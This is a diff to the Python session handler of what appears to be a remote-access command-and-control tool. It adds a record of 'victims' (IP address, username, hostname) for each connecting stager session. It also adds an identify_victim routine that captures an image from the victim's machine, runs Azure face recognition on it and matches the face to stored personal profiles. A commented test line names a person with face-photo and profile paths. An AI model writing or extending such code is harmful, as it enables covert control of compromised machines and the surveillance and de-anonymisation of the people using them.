@@ -3,6 +3,7 @@ from azure import faceRec
 import threading, socket, time, sys
 import json
 
+
 class MultiHandler:
 	def __init__(self,server):
 		self.server = server
@@ -12,28 +13,32 @@ class MultiHandler:
 		self.sessions_uid = dict()
 		self.person_db = dict()
 		self.faceid_mapping = dict()
+
 		self.victims = dict()
+		self.victims['victims'] = []
+		self.victims['total_victims'] = 0
 		self.victims_modify = False
+		self.identified_victims = dict()
+		self.identified_victims['identified_victims'] = []
+		self.identified_victims['total_identified_victims'] = 0
+
 ###		For test
 ###		self.victims = {1: {"name": "Ruchir Shah", "picture": "DB/Ruchir/ruchir_face.jpg", "privacy": "DB/Ruchir/profile_Ruchir Shah.json"}}
 ###		self.victims_modify = True
+
 		self.handle = h.COLOR_INFO + "MultiHandler" + h.ENDC + "> "
 		self.is_running = False
 		self.load_person_info()
 		self.load_faceid2person()
 
-
 	def load_person_info(self):
 		json_file = open("privacy_db.json")
 		self.person_db = json.load(json_file)
-		print(self.person_db)
 		json_file.close()
-
 
 	def load_faceid2person(self):
 		json_file = open("faceid_mapping.json")
 		self.faceid_mapping = json.load(json_file)
-		print(self.faceid_mapping)
 		json_file.close()
 
 
@@ -53,7 +58,7 @@ class MultiHandler:
 		id_number = 1
 		while 1:
 			if self.is_running:
-				session = self.server.listen_for_stager()
+				session, hostAddress = self.server.listen_for_stager()
 				if session:
 					if session.uid in self.sessions_uid.keys():
 						if self.sessions_uid[session.uid].needs_refresh:
@@ -64,10 +69,22 @@ class MultiHandler:
 						self.sessions_id[id_number] = session
 						self.new_session_id = id_number
 						session.id = id_number
+						victim = {}
+						victim_info = {}
+						victim['session_id'] = id_number
+						victim['ip_address'] = hostAddress
+						victim_info['username'] = session.username
+						victim_info['hostname'] = session.hostname
+						victim_info['type'] = session.type
+						victim['victim_info'] = victim_info
+						self.victims['victims'].append(victim)
+						self.victims['total_victims'] += 1
 						id_number += 1
 						sys.stdout.write("\n{0}[*]{2} Session {1} opened{2}\n{3}".format(h.COLOR_INFO,str(session.id),h.WHITE,self.handle))
 						sys.stdout.flush()
-						self.init_interact_with_session()
+						self.identify_victim(session.id)
+						self.victims_modify = True
+#						self.init_interact_with_session()
 			else:
 				return
 
@@ -150,22 +167,58 @@ class MultiHandler:
 		for command in commands:
 			self.show_command(command[0],command[1])
 
+	def identify_victim(self, session_id):
+		if session_id < 1:
+			h.info_error("Invalid Session")
+			return False
+		try:
+			file_name = self.sessions_id[session_id].init_interact()
+			response = faceRec(file_name)
+			response = json.loads(response)
+			h.info_general("Face Rec Result:")
+			print(response)
+			if response['status'] == "Ok":
+				print(response['faceId'])
+				faceid = response['faceId']
+				if faceid in self.faceid_mapping['FaceToPerson']:
+					person_name = self.faceid_mapping['FaceToPerson'][faceid]
+					for person in self.person_db['Person']:
+						if person['name'] == person_name:
+							identified_victim = {}
+							identified_victim['session_id'] = session_id
+							identified_victim['profile'] = person
+							self.identified_victims['identified_victims'].append(identified_victim)
+							self.identified_victims['total_identified_victims'] += 1
+							break
+					return True
+				else:
+					print("Person not in Database")
+					return False
+			else:
+				print("No Face Rec result")
+				return False
+		except:
+			h.info_error("Person cannot be recognized")
+			return False
 
+	# When victim connected to server, init the interaction by identify victims'
+	# information
 	def init_interact_with_session(self):
 		if self.new_session_id < 1:
-			print "Usage: interact (session number)"
+			h.info_error("Invalid Session")
 			return
 		try:
 			file_name = self.sessions_id[self.new_session_id].init_interact()
 			response = faceRec(file_name)
 			response = json.loads(response)
+			h.info_general("Face Rec Result:")
+			print(response)
 			if response['status'] == "Ok":
 				print(response['faceId'])
 				faceid = response['faceId']
 			else:
 				print("no data match")
 				faceid = ""
-#			faceid = "faceid1"
 			if faceid in self.faceid_mapping['FaceToPerson']:
 				person_name = self.faceid_mapping['FaceToPerson'][faceid]
 				for person in self.person_db['Person']:
@@ -173,22 +226,14 @@ class MultiHandler:
 						self.victims[self.new_session_id] = person
 						self.victims_modify = True
 		except:
-			h.info_error("Invalid Session")
+			h.info_error("Person cannot be recognized")
 
 
 	def interact(self, session_id, cmd_data):
-#		h.info_general("Listening on port {0}...".format(self.server.port))
-#		h.info_general("Type \"help\" for commands")
 		try:
 			cmd = cmd_data.split()[0]
 			para = {"cmd": cmd, "args": cmd_data[len(cmd) + 1:]}
 			result = self.interact_with_session(session_id, cmd_data)
-			'''
-			if cmd == "picture" and not result:
-				return result
-			elif cmd == "screenshot" and not result:
-				return result
-			'''
 			return result
 		except KeyboardInterrupt:
 			sys.stdout.write("\n")
